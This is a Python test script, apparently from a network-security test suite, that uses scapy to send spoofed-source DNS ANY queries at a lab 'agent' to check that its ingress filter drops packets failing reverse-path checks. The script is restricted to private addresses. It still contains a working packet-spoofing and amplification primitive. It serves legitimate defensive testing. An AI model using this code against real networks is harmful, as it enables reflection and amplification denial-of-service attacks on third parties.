#!/usr/bin/env python3
"""dns_any.py — Send spoofed-source DNS ANY queries against an agent.

Used by suite 44 (scapy amplification). The attacker VM crafts UDP/53
queries whose source address is a *third-party* RFC1918 host (the
spoofed victim) — the canonical setup for reflection / amplification
attacks. The agent's ingress scrub layer is expected to identify the
RPF mismatch (the source claims an IP that does not own the route
through this interface) and drop the packet *before* a response is
generated.

Usage:
    sudo dns_any.py --dst <agent_ip> [--spoof-src <victim_ip>]
                    [--count N] [--rate PPS] [--qname example.com]

The script refuses non-RFC1918 destinations to prevent accidental
public-Internet floods.
"""

from __future__ import annotations

import argparse
import ipaddress
import sys
import time

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send  # type: ignore
except ImportError:
    print("scapy not installed (run story 34.3 provisioner)", file=sys.stderr)
    sys.exit(2)


_PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]


def _is_rfc1918(addr: str) -> bool:
    ip = ipaddress.ip_address(addr)
    return any(ip in net for net in _PRIVATE_NETS)


def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--dst", required=True, help="agent IP under test")
    p.add_argument(
        "--spoof-src",
        default="192.168.56.99",
        help="spoofed victim source IP (must be RFC1918)",
    )
    p.add_argument("--count", type=int, default=500, help="packet count")
    p.add_argument("--rate", type=int, default=200, help="target pps")
    p.add_argument(
        "--qname",
        default="example.com",
        help="DNS qname used in the ANY query",
    )
    return p.parse_args()


def main() -> int:
    args = _parse_args()
    if not _is_rfc1918(args.dst):
        print(f"refusing non-RFC1918 dst {args.dst}", file=sys.stderr)
        return 2
    if not _is_rfc1918(args.spoof_src):
        print(f"refusing non-RFC1918 spoof_src {args.spoof_src}", file=sys.stderr)
        return 2

    inter = 1.0 / max(args.rate, 1)
    pkt = (
        IP(src=args.spoof_src, dst=args.dst)
        / UDP(sport=33333, dport=53)
        / DNS(rd=1, qd=DNSQR(qname=args.qname, qtype="ANY"))
    )

    sent = 0
    start = time.monotonic()
    while sent < args.count:
        send(pkt, verbose=False)
        sent += 1
        time.sleep(inter)
    elapsed = time.monotonic() - start
    pps = sent / elapsed if elapsed > 0 else float(sent)
    print(f"dns_any sent={sent} elapsed={elapsed:.2f}s pps={pps:.1f}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
